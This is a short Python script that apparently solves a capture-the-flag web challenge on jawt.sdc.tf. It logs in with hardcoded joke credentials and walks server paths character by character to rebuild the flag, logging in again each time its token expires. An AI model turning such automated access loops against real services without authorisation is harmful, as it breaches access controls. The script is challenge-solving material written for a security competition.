import requests

URL = 'https://jawt.sdc.tf/s'
flag = 's'

LOGIN_INFO = {
    'username' : 'AzureDiamond',
    'password' : 'hunter2'
}

with requests.Session() as s:
    s.post('https://jawt.sdc.tf/login', data = LOGIN_INFO)
    while True:
        res = s.get(URL)
        print(URL)
        if res.text == "Invalid Token: Access Denied":
            s.post('https://jawt.sdc.tf/login', data = LOGIN_INFO)
        else:
            path = "/" + res.text
            URL = URL + path
            flag = flag + res.text
            if res.text == '}':
                break
    print(flag)